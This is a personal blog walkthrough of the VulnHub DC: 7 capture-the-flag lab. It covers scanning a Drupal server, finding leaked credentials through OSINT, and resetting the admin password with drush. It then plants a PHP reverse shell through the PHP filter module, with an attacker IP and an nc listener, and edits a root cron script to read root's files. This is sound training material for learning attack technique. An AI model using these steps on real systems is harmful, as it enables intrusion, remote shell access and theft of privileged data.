<!DOCTYPE html>
<html>
  <head>
    <title>Entry 0x06 - VulnHub: DC: 7 Walkthrough</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"  media="screen,projection"/>
    <link rel="stylesheet" href="/assets/css/styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  </head>

  <body class="">
    <nav>
  <div class="nav-wrapper black"><ul id="nav-mobile" class="left">
      
        <li ><a href="/">Home</a></li>
      
        <li ><a href="/about.html">About</a></li>
      
        <li ><a href="/blog.html">Blog</a></li>
      
    </ul>
    <ul id="nav-mobile" class="right">
      <li><a class="tooltipped" data-position="bottom" data-tooltip="Send me an email" href="mailto:arjuntherajeev@gmail.com?subject=Hello%2C+I+just+visited+diaryofarjun.com"><i class="material-icons">mail</i></a></li>
    </ul>
  </div>
</nav>
    <div class="">
    <style>
    header{
        background: url('/assets/images/screen-shot-2019-09-02-at-10.52.52-pm-1.png');
        background-size: cover;
        background-position: center;
        min-height: 430px;
    }
    @media screen and (max-width: 670px){
        header{
        min-height: 200px;
        }
    }
</style>
<header>
</header>
<div class="white">
    <div class="row container flow-text">
        <h3 class="header">Entry 0x06 - VulnHub: DC: 7 Walkthrough</h3>
        <h6>Posted on <b>03 September 2019</b></h6>
        <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-text="Entry 0x06 - VulnHub: DC: 7 Walkthrough" data-url="https://diaryofarjun.com/2019/09/03/vulnhub-dc-7-walkthrough.html" data-via="arjuntherajeev" data-related="arjuntherajeev" data-show-count="false">Tweet</a>        
        <br/>
        <p class="grey-text text-darken-3 lighten-3"><p><strong>DC: 7</strong> is a challenge posted on <a href="https://www.vulnhub.com/entry/dc-7,356/">VulnHub</a> created by <a href="https://www.vulnhub.com/author/dcau,610/">DCAU</a>. This is a write-up of my experience solving this awesome CTF challenge.</p>

<p>With my Attack Machine (<strong>Kali Linux</strong>) and Victim Machine (<strong>DC: 7</strong>) set up and running, I decided to get down to solving this challenge.</p>

<blockquote>
  <p>Read more about my set up and environment <a href="/2019/05/25/entry-0x01-my-first-post.html">here</a></p>
</blockquote>

<p>I decided to start my journey with <code class="language-plaintext highlighter-rouge">netdiscover</code> to complete the <em>host discovery</em> phase as follows: <code class="language-plaintext highlighter-rouge">netdiscover -r 192.168.56.0/24</code></p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-10.46.40-pm.png" alt="Screen Shot 2019-09-02 at 10.46.40 PM" /></p>

<p>Cool! The victim machine has the IP address <code class="language-plaintext highlighter-rouge">192.168.56.103</code>. Let’s continue with some port scanning!</p>

<p>I decided to use <code class="language-plaintext highlighter-rouge">nmap</code> with options enabled to scan <em>all</em> ports and provide details about the service running using the command: <code class="language-plaintext highlighter-rouge">nmap -p- -sV 192.168.56.103</code></p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-10.49.58-pm.png" alt="Screen Shot 2019-09-02 at 10.49.58 PM.png" /></p>

<p>The <code class="language-plaintext highlighter-rouge">nmap</code> scan revealed that ports <code class="language-plaintext highlighter-rouge">80</code> and <code class="language-plaintext highlighter-rouge">22</code> were open. I decided to hit the browser using <strong>Firefox ESR</strong>. I navigated to the URL <code class="language-plaintext highlighter-rouge">http://192.168.56.103</code> as follows:</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-10.52.52-pm.png" alt="Screen Shot 2019-09-02 at 10.52.52 PM.png" /></p>

<p>Drupal!</p>

<p>…And a message from @DCAU asking us <strong>NOT</strong> to try the easy way out with brute-force or dictionary attacks. Clearly, there is a bigger picture here. If only we knew how to find it!</p>

<p>I decided to play with the website a little bit. First, I decided to check out the Login page.</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.01.03-pm.png" alt="Screen Shot 2019-09-02 at 11.01.03 PM.png" /></p>

<p>Obviously, neither <code class="language-plaintext highlighter-rouge">admin/admin</code> nor <code class="language-plaintext highlighter-rouge">root/root</code> worked ;)</p>

<p>Analyzing <code class="language-plaintext highlighter-rouge">robots.txt</code> wasn’t useful either.</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.03.43-pm.png" alt="Screen Shot 2019-09-02 at 11.03.43 PM.png" /></p>

<p>Now, in the back of my mind, I was sure that like <code class="language-plaintext highlighter-rouge">WPScan</code> for WordPress and <code class="language-plaintext highlighter-rouge">joomscan</code> for Joomla… there must be something similar for Drupal. Some googling revealed <a href="https://github.com/droope/droopescan"><code class="language-plaintext highlighter-rouge">droopescan</code></a>, an open-source scanner for several CMSs including Drupal available on Kali Linux.</p>

<p>I decided to use <code class="language-plaintext highlighter-rouge">droopescan</code> to scan the Drupal website using the following command: <code class="language-plaintext highlighter-rouge">droopescan scan -u http://192.168.56.103</code></p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.22.29-pm.png" alt="Screen Shot 2019-09-02 at 11.22.29 PM.png" /></p>

<p>Interesting!</p>

<p>The Drupal version appears to be <code class="language-plaintext highlighter-rouge">8.7.x</code> and using the <code class="language-plaintext highlighter-rouge">startupgrowth_lite</code> theme. I must admit that I was not greatly knowledgeable of Drupal at that time. So, I jumped over to <code class="language-plaintext highlighter-rouge">searchsploit</code> to find a way to own this box!</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.25.58-pm.png" alt="Screen Shot 2019-09-02 at 11.25.58 PM.png" /></p>

<p>Nothing of significance!</p>

<p>This was when I felt absolutely stuck and decided to ping @DCAU7 (creator of the challenge) on Twitter for a hint. Amazingly, he responded quickly with a tip that got me right back in the game!</p>

<p>The real way to go about this challenge requires an open mind and “outside the box” thinking. @DCAU7 meant this literally. I decided to navigate back to the homepage.</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-10.52.52-pm.png" alt="Screen Shot 2019-09-02 at 10.52.52 PM" /></p>

<p>At the footer, there is some text saying <strong>@DC7USER</strong></p>

<p>In my initial look, I assumed it was the author’s Twitter handle. Upon closer inspection, something looked fishy. I decided to browse to the URL <a href="http://twitter.com/DC7USER">http://twitter.com/DC7USER</a></p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.32.32-pm.png" alt="Screen Shot 2019-09-02 at 11.32.32 PM.png" /></p>

<p>Ka-ching!</p>

<p>Ooh, a GitHub link. I proceeded by following the GitHub URL to <a href="https://github.com/Dc7User/">https://github.com/Dc7User/</a></p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.34.39-pm.png" alt="Screen Shot 2019-09-02 at 11.34.39 PM.png" /></p>

<p>Oh my!</p>

<p>A very real GitHub account with a single repository <code class="language-plaintext highlighter-rouge">staffdb</code>.  I decided to look inside this mysterious repository.</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.36.06-pm.png" alt="Screen Shot 2019-09-02 at 11.36.06 PM.png" /></p>

<p>Interesting! Lots and lots of <code class="language-plaintext highlighter-rouge">PHP</code> code files. They must contain something valuable. I decided that searching these <code class="language-plaintext highlighter-rouge">PHP</code> files would be easier with a text editor. So, I proceeded by cloning the repository using <code class="language-plaintext highlighter-rouge">git clone</code> and opening the folder using <a href="https://code.visualstudio.com/">Visual Studio Code</a>.</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.41.18-pm.png" alt="Screen Shot 2019-09-02 at 11.41.18 PM.png" /></p>

<p>Going through each <code class="language-plaintext highlighter-rouge">PHP</code> file one by one, I found that the most interesting file was <code class="language-plaintext highlighter-rouge">config.php</code> which contained the following data:</p>

<p><img src="/assets/images/screen-shot-2019-09-02-at-11.42.52-pm.png" alt="Screen Shot 2019-09-02 at 11.42.52 PM.png" /></p>

<p>Wow! Credentials!</p>

<ul>
  <li>Username: <code class="language-plaintext highlighter-rouge">dc7user</code></li>
  <li>Password <code class="language-plaintext highlighter-rouge">MdR3xOgB7#dW</code></li>
</ul>

<p>Where do I use them? Drupal? SSH? I decided to try both.</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-5.50.00-pm.png" alt="Screen Shot 2019-09-03 at 5.50.00 PM.png" /></p>

<p>Drupal Login did not work. Moving on to SSH… please work!</p>

<p>I attempted to gain SSH access to the box using the command: <code class="language-plaintext highlighter-rouge">ssh dc7user@192.168.56.103</code></p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-5.52.48-pm.png" alt="Screen Shot 2019-09-03 at 5.52.48 PM.png" /></p>

<p>Woohoo! We got shell as <code class="language-plaintext highlighter-rouge">dc7user</code>!</p>

<p>What’s next? Privilege escalation. I was determined to find a way out of <code class="language-plaintext highlighter-rouge">dc7user</code> and reach the flag. I decided to go exploring the box.</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-5.55.54-pm.png" alt="Screen Shot 2019-09-03 at 5.55.54 PM.png" /></p>

<p>A quick <code class="language-plaintext highlighter-rouge">ls -l</code> revealed a file called <code class="language-plaintext highlighter-rouge">mbox</code> and a directory called <code class="language-plaintext highlighter-rouge">backups</code> containing 2 <code class="language-plaintext highlighter-rouge">GPG</code> encrypted files. As far as I was concerned, these were encrypted because they contained some valuable information. Perhaps, some credentials for the Drupal website?</p>

<p>What’s inside <code class="language-plaintext highlighter-rouge">mbox</code>? Maybe some mail? I decided to run a simple <code class="language-plaintext highlighter-rouge">cat mbox</code> command to know more.</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-5.59.03-pm.png" alt="Screen Shot 2019-09-03 at 5.59.03 PM.png" /></p>

<p>Well, we got mail. Upon closer inspection, each mail is a notification about the result of a scheduled <code class="language-plaintext highlighter-rouge">cron</code> job. One important observation is the <code class="language-plaintext highlighter-rouge">Subject</code> field of the mail which tells us the location of the scheduled script as: <code class="language-plaintext highlighter-rouge">/opt/scripts/backups.sh</code></p>

<p>Let’s look inside!</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-6.03.39-pm.png" alt="Screen Shot 2019-09-03 at 6.03.39 PM.png" /></p>

<p>Jackpot! We can clearly see what’s happening here. The script flows as follows:</p>

<ol>
  <li>Delete contents of the <code class="language-plaintext highlighter-rouge">/home/dc7user/backups</code> directory</li>
  <li>Use <code class="language-plaintext highlighter-rouge">drush</code> (<a href="https://www.digitalocean.com/community/tutorials/a-beginner-s-guide-to-drush-the-drupal-shell">Drupal shell</a>) to create an <code class="language-plaintext highlighter-rouge">SQL</code> dump of the Drupal database</li>
  <li>Create a compressed copy of all the website files</li>
  <li>Encrypt both files using <code class="language-plaintext highlighter-rouge">GPG</code> with the passphrase <code class="language-plaintext highlighter-rouge">PickYourOwnPassword</code></li>
  <li>Sets the owner of contents inside <code class="language-plaintext highlighter-rouge">/home/dc7user/backups</code> as <code class="language-plaintext highlighter-rouge">dc7user:dc7user</code> which means both user and group access is limited to <code class="language-plaintext highlighter-rouge">dc7user</code></li>
  <li>Deletes the files</li>
</ol>

<p>Now, I was ecstatic because I knew how to own this box. This technique is well known in the world of CTF - You modify the script, add in lines to output the contents of <code class="language-plaintext highlighter-rouge">flag.txt</code> to a readable file and let it run in its own glory as root.</p>

<p>But… there was a problem!</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-6.12.40-pm.png" alt="Screen Shot 2019-09-03 at 6.12.40 PM.png" /></p>

<p>I am <code class="language-plaintext highlighter-rouge">dc7user</code> and I cannot modify this file. I need to become <code class="language-plaintext highlighter-rouge">www-data</code> for my technique to work. Besides, I knew that @DCAU wouldn’t make it too easy for us.</p>

<p>Moving on, I decided to use the acquired passphrase <code class="language-plaintext highlighter-rouge">PickYourOwnPassword</code> and view the contents of the 2 encrypted files inside <code class="language-plaintext highlighter-rouge">/home/dc7user/backups</code>. It is crucial to remember what the script does because the contents of this directory are deleted periodically. I decided to create a <em>temporary</em> directory to comfortably solve this challenge using the command: <code class="language-plaintext highlighter-rouge">mkdir /tmp/arj</code></p>

<p>Okay, let’s decrypt!</p>

<p>I decided to start with the <code class="language-plaintext highlighter-rouge">SQL</code> database dump - <code class="language-plaintext highlighter-rouge">website.sql</code> <code class="language-plaintext highlighter-rouge">gpg --decrypt website.sql.gpg &gt; /tmp/arj/website.sql</code></p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-6.18.12-pm.png" alt="Screen Shot 2019-09-03 at 6.18.12 PM.png" /></p>

<p>I entered the passphrase as <code class="language-plaintext highlighter-rouge">PickYourOwnPassword</code></p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-6.20.02-pm-e1567522203727.png" alt="Screen Shot 2019-09-03 at 6.20.02 PM" /></p>

<p>It worked!</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-6.50.24-pm.png" alt="Screen Shot 2019-09-03 at 6.50.24 PM" /></p>

<p>Great, we have <code class="language-plaintext highlighter-rouge">website.sql</code> inside <code class="language-plaintext highlighter-rouge">/tmp/arj</code> ready for exploration. As seen above, the size of the decrypted file is 380 MB.</p>

<p>Our goal is to search this file for user credentials for Drupal Login. Ideally, once we gain GUI access, we can launch a reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code> and proceed with owning the box.</p>

<p>I decided to take a peek at the <code class="language-plaintext highlighter-rouge">SQL</code> dump using the command: <code class="language-plaintext highlighter-rouge">head -n 50 website.sql</code></p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-6.55.04-pm.png" alt="Screen Shot 2019-09-03 at 6.55.04 PM.png" /></p>

<p>Knowing the table name would be useful. However, I had no clue about Drupal’s internal naming conventions. I decided to find it the hard way with some good ol’ <code class="language-plaintext highlighter-rouge">grep</code> magic using the command: <code class="language-plaintext highlighter-rouge">cat website.sql | grep "Table structure for table"</code></p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-6.58.49-pm.png" alt="Screen Shot 2019-09-03 at 6.58.49 PM.png" /></p>

<p>3 tables caught my attention:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">users</code></li>
  <li><code class="language-plaintext highlighter-rouge">users_data</code></li>
  <li><code class="language-plaintext highlighter-rouge">users_field_data</code></li>
</ul>

<p>Now, my solution is neither the cleanest nor most efficient… but I wanted the credentials and this worked.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 30 "Table structure for table `users`"
</code></pre></div></div>

<p><img src="/assets/images/screen-shot-2019-09-03-at-7.20.39-pm.png" alt="Screen Shot 2019-09-03 at 7.20.39 PM.png" /></p>

<p>The optional argument <code class="language-plaintext highlighter-rouge">-A</code> refers to lines <em>after</em> the matched line. We can conclude that the <code class="language-plaintext highlighter-rouge">users</code> table does not contain credentials. Moving on to <code class="language-plaintext highlighter-rouge">users_data</code> using the command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 30 "Table structure for table `users_data`"
</code></pre></div></div>

<p><img src="/assets/images/screen-shot-2019-09-03-at-7.22.43-pm.png" alt="Screen Shot 2019-09-03 at 7.22.43 PM.png" /></p>

<p>Nope, nothing. Moving on to the final table <code class="language-plaintext highlighter-rouge">users_field_data</code> using the command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 30 "Table structure for table `users_field_data`"
</code></pre></div></div>

<p><img src="/assets/images/screen-shot-2019-09-03-at-7.24.29-pm.png" alt="Screen Shot 2019-09-03 at 7.24.29 PM.png" /></p>

<p>Woohoo! The table <code class="language-plaintext highlighter-rouge">users_field_data</code> contains <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">pass</code>, <code class="language-plaintext highlighter-rouge">mail</code> and other user-specific fields. Let’s expand the <code class="language-plaintext highlighter-rouge">grep</code> and view some data!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 40 "Table structure for table `users_field_data`"
</code></pre></div></div>

<p><img src="/assets/images/screen-shot-2019-09-03-at-7.27.24-pm.png" alt="Screen Shot 2019-09-03 at 7.27.24 PM.png" /></p>

<p>As seen above in the screenshot, we got credentials for <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">dc7user</code>. Only problem being that the passwords were hashed. I tried cracking the hash online with the hopes that it was a known value but there was nothing!</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-7.29.01-pm.png" alt="Screen Shot 2019-09-03 at 7.29.01 PM.png" /></p>

<p>At this point, I was stuck and pondered about the next step.</p>

<p>The motive was still to become <code class="language-plaintext highlighter-rouge">www-data</code> and modify the <code class="language-plaintext highlighter-rouge">cron</code> script to get the flag. I proceeded with some research about Drupal. Specifically, I was trying to find a way to change the password of an existing user since I confirmed the existence of 2 users - <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">dc7user</code>.</p>

<p>Interestingly, I found that the <code class="language-plaintext highlighter-rouge">drush</code> tool for Drupal is pretty useful when it comes to changing the password of <code class="language-plaintext highlighter-rouge">admin</code>. The syntax was simple:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drush user-password USERNAME --password="SOMEPASSWORD"
</code></pre></div></div>

<p>I decided to try it… why not?</p>

<p><code class="language-plaintext highlighter-rouge">drush user-password admin --password="SOMEPASSWORD"</code></p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-8.09.49-pm.png" alt="Screen Shot 2019-09-03 at 8.09.49 PM.png" /></p>

<p>Hmm, an error.</p>

<p>Some googling and research later, I discovered that executing <code class="language-plaintext highlighter-rouge">drush</code> from the <code class="language-plaintext highlighter-rouge">/var/www/html</code> directory would be successful.</p>

<p>I decided to try it out.</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-8.10.14-pm.png" alt="Screen Shot 2019-09-03 at 8.10.14 PM.png" /></p>

<p>Success!</p>

<p>I just changed the password of <code class="language-plaintext highlighter-rouge">admin</code> to <code class="language-plaintext highlighter-rouge">SOMEPASSWORD</code>. Let’s login to Drupal!</p>

<p><img src="/assets/images/screen-shot-2019-09-03-at-11.50.16-pm.png" alt="Screen Shot 2019-09-03 at 11.50.16 PM.png" /></p>

<p>Yeah! We are in!</p>

<p>So far so good. The next step is to establish a reverse shell. The <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> seemed like a viable option. The question was - how can we upload <code class="language-plaintext highlighter-rouge">PHP</code> code on Drupal?</p>

<p>WordPress has taught me that themes, modules, and plugins are typical vectors. I decided to do some research. You know, Google-for-the-soul.</p>

<p>In my googling, I came across a wonderful article titled <strong><a href="https://www.sevenlayers.com/index.php/164-drupal-to-reverse-shell">Drupal to Reverse Shell</a></strong> describing how we can work with an authenticated Drupal interface to upload <code class="language-plaintext highlighter-rouge">PHP</code> code and establish a reverse shell session. However, there was a problem.</p>

<p>The article achieves a reverse shell by enabling a Drupal module called <strong><a href="https://www.drupal.org/docs/8/modules/php/overview">PHP filter</a></strong>. The documentation contains an interesting snippet:</p>

<blockquote>
  <p>The PHP filter core module has been removed from core starting with version 8.x.</p>
</blockquote>

<p>Our victim machine is running Drupal <code class="language-plaintext highlighter-rouge">8.7.x</code> and does not come with the PHP filter module. But… there is always a way. Manual installation!</p>

<p><a href="https://www.drupal.org/project/php">This link</a> contains a <code class="language-plaintext highlighter-rouge">.tar.gz</code> download which can be directly uploaded to Drupal as <code class="language-plaintext highlighter-rouge">admin</code>.</p>

<p>I proceeded by downloading the <code class="language-plaintext highlighter-rouge">.tar.gz</code> module file on my attack machine. Don’t forget to check the networking settings. I switched mine from <strong>host-only networking</strong> to <strong>NAT</strong> for just a second.</p>

<p>Time to install the new module!</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.07.53-am.png" alt="Screen Shot 2019-09-04 at 12.07.53 AM.png" /></p>

<p>On the <strong>Extend</strong> page, I clicked on the <strong>+ Install new module</strong> button.</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.10.47-am.png" alt="Screen Shot 2019-09-04 at 12.10.47 AM.png" /></p>

<p>I clicked on the <strong>Browse</strong> button under <strong>Upload a module or theme archive to install</strong> and clicked on the <strong>Install</strong> button.</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.11.47-am.png" alt="Screen Shot 2019-09-04 at 12.11.47 AM.png" /></p>

<p>Woohoo! Installed successfully. Let’s move on!</p>

<p>I clicked on <strong>Enable newly added modules</strong> which brought me back to the <strong>Extend</strong> page. Here, I scrolled down and select the radio button next to <strong>PHP Filter</strong> in order to enable it.</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.12.59-am.png" alt="Screen Shot 2019-09-04 at 12.12.59 AM.png" /></p>

<p>Next, scroll down completely and click on the <strong>Install</strong> button to reflect the changes on Drupal.</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.15.39-am.png" alt="Screen Shot 2019-09-04 at 12.15.39 AM.png" /></p>

<p>Great! We installed <strong>PHP filter</strong>. The next step is to use it to upload the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> code. To achieve this, I decided to create a new post on Drupal.</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.24.23-am.png" alt="Screen Shot 2019-09-04 at 12.24.23 AM.png" /></p>

<p>Important steps to follow:</p>

<ol>
  <li>Select the <strong>Text format</strong> as <code class="language-plaintext highlighter-rouge">PHP code</code></li>
  <li>Copy the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> code to the <strong>Body</strong>. On Kali Linux, it can be found in <code class="language-plaintext highlighter-rouge">/usr/share/laudanum/php/php-reverse-shell.php</code></li>
  <li>
    <p>Edit the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> code and modify the following lines:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     - $ip = '192.168.56.102'; // Attack machine IP
            
     - $port = 8888; // Desired port
</code></pre></div>    </div>
  </li>
  <li>Open a shell and run <code class="language-plaintext highlighter-rouge">nc -lvp 8888</code> on attack machine to listen for a reverse shell</li>
</ol>

<p>Once these steps are completed. Click on the <strong>Preview</strong> button and watch the magic unfold!</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.29.50-am.png" alt="Screen Shot 2019-09-04 at 12.29.50 AM.png" /></p>

<p>Reverse shell! I am finally <code class="language-plaintext highlighter-rouge">www-data</code>. Hooray!</p>

<p>Okay… back to the game plan. We simply need to modify <code class="language-plaintext highlighter-rouge">/opt/scripts/backups.sh</code> with the following lines of code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
cat /root/\* &gt; /tmp/arj/flag.txt
</code></pre></div></div>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.53.32-am.png" alt="Screen Shot 2019-09-04 at 12.53.32 AM.png" /></p>

<p>Once this was done, I simply monitored my temporary directory <code class="language-plaintext highlighter-rouge">/tmp/arj</code> for a file called <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>

<p><img src="/assets/images/screen-shot-2019-09-04-at-12.55.59-am.png" alt="Screen Shot 2019-09-04 at 12.55.59 AM.png" /></p>

<p>Yeah! There you have it. We did it :)</p>

<h3 id="my-thoughts">My Thoughts</h3>

<p>That was absolutely crazy! I never expected anything less from @DCAU.</p>

<p>For me, <strong>DC: 7</strong> was all about thinking outside the box and reinforcing good practices. Owning a box running Drupal was an added bonus because of all its details and intricacies.</p>

<p>I owe credit to @DCAU for an initial hint about the Twitter handle. The idea that most CTF challenges lack OSINT is known and needs attention. With more challenges such as these, I am sure that I can build my skills.</p>

<p>As always, I cannot wait for the next one in the <a href="https://www.vulnhub.com/series/dc,199/">DC series</a>!</p>

<p>If you enjoyed reading this, please check out my <a href="/2019/05/29/vulnhub-dc-6-walkthrough">DC: 6 walkthrough</a> and <a href="/2019/06/03/vulnhub-dc-3-walkthrough">DC: 3 walkthrough</a> which are challenges by @DCAU in the <a href="https://www.vulnhub.com/series/dc,199/">DC series</a>.</p>
</p>
    </div>
    <div class="row container">
        
        <div onclick="window.location='/tags.html#beginner'" class="chip waves-effect waves-block waves-light">Beginner</div>
        
        <div onclick="window.location='/tags.html#ctf'" class="chip waves-effect waves-block waves-light">CTF</div>
        
        <div onclick="window.location='/tags.html#kali'" class="chip waves-effect waves-block waves-light">Kali</div>
        
        <div onclick="window.location='/tags.html#linux'" class="chip waves-effect waves-block waves-light">Linux</div>
        
        <div onclick="window.location='/tags.html#vulnhub'" class="chip waves-effect waves-block waves-light">Vulnhub</div>
        
        <div onclick="window.location='/tags.html#walkthrough'" class="chip waves-effect waves-block waves-light">Walkthrough</div>
        
        <div onclick="window.location='/tags.html#writeup'" class="chip waves-effect waves-block waves-light">Writeup</div>
        
        <div onclick="window.location='/tags.html#security'" class="chip waves-effect waves-block waves-light">Security</div>
        
        <div onclick="window.location='/tags.html#dc-series'" class="chip waves-effect waves-block waves-light">DC-Series</div>
        
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    var elems = document.querySelectorAll('.materialboxed');
    var instances = M.Materialbox.init(elems);
    });
</script>
</html>
    </div>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        var elems = document.querySelectorAll('.tooltipped');
        var instances = M.Tooltip.init(elems);
      });
    </script>
  </body>
</html>